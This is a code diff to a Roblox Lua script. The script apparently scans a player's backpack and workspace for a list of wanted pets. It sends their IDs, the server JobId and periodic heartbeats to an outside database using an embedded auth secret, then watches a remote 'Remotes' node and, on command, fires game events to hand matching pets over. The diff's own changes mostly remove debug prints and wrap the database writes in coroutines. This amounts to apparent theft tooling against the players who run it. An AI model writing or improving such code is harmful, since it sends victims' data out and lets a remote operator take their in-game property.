@@ -19,7 +19,6 @@ for _, Tool in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
 	for _, DesiredPetName in DesiredPets do
 		if string.find(string.lower(Tool.Name), string.lower(DesiredPetName)) then
 			HavePets = true
-			print("Backpack found")
 			ListOfPets[Tool.Name.."_"..math.random(100000, 999999)] = Tool:GetAttribute("PET_UUID")
 		end
 	end
@@ -33,7 +32,7 @@ for _, Pet in game:GetService("Workspace").PetsPhysical:GetChildren() do
 				PetName = v.Name
 			end
 		end
-		
+
 		for _, DesiredPetName in DesiredPets do
 			if string.find(string.lower(PetName), string.lower(DesiredPetName)) then
 				HavePets = true
@@ -42,13 +41,8 @@ for _, Pet in game:GetService("Workspace").PetsPhysical:GetChildren() do
 		end
 	end
 end
-	
-wait()
 
-print("ooooooooooooooooooooo")
-for i, v in ListOfPets do
-	print(i, v)
-end
+wait()
 
 local function ReadDatabase()
 	local database = URL..".json?auth="..Secret
@@ -136,16 +130,19 @@ if data ~= nil then
 	if HavePets == true then
 		WriteDatabase("Wanteds/"..LocalPlayer.Name, "JobId", game.JobId)
 		WriteDatabase("Wanteds/"..LocalPlayer.Name, "LastSeen", os.time())
-		
+
 		if data.Wanteds[LocalPlayer.Name].Pets then
 			DeleteDatabase("Wanteds/"..LocalPlayer.Name, "Pets")
 			wait(0.1)
 		end
-		
+
 		for PetName, PetId in ListOfPets do
-			WriteDatabase("Wanteds/"..LocalPlayer.Name.."/Pets", PetName, PetId)
+			coroutine.wrap(function()
+				print(PetName)
+				WriteDatabase("Wanteds/"..LocalPlayer.Name.."/Pets", PetName, PetId)
+			end)()
 		end
-		
+
 		coroutine.wrap(function()
 			while wait(10) do
 				WriteDatabase("Wanteds/"..LocalPlayer.Name, "LastSeen", os.time())
@@ -169,20 +166,20 @@ coroutine.wrap(function()
 						DeleteDatabase("Remotes", Username)
 						local Location = nil
 						local PetInstance = nil
-						
+
 						for i, Pet in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
 							if Pet:GetAttribute("PET_UUID") == PetId and Pet:GetAttribute("Duped") == nil then
 								Location = "Backpack"
 								PetInstance = Pet
 							end
 						end
-						
+
 						for i, Pet in game:GetService("Workspace").PetsPhysical:GetChildren() do
 							if Pet:GetAttribute("OWNER") == LocalPlayer.Name and Pet:GetAttribute("UUID") == PetId then
 								Location = "Workspace"
 							end
 						end
-						
+
 						local function GetPetInInventory(PetInstance)
 							local ToolModelLoaded = false
 							local ToolHandleChildren = PetInstance.Handle:GetChildren() 
@@ -220,7 +217,7 @@ coroutine.wrap(function()
 							wait(0.1)
 							PetInstance:Destroy()
 						end
-						
+
 						if Location ~= nil then
 							if Location == "Backpack" then
 								GetPetInInventory(PetInstance)
@@ -231,14 +228,14 @@ coroutine.wrap(function()
 								}
 								game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer(unpack(args))
 								wait(0.1)
-								
+
 								for i, Pet in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
 									if Pet:GetAttribute("PET_UUID") == PetId and Pet:GetAttribute("Duped") == nil then
 										PetInstance = Pet
 									end
 								end
 								wait()
-								
+
 								GetPetInInventory(PetInstance)
 							end
 						end
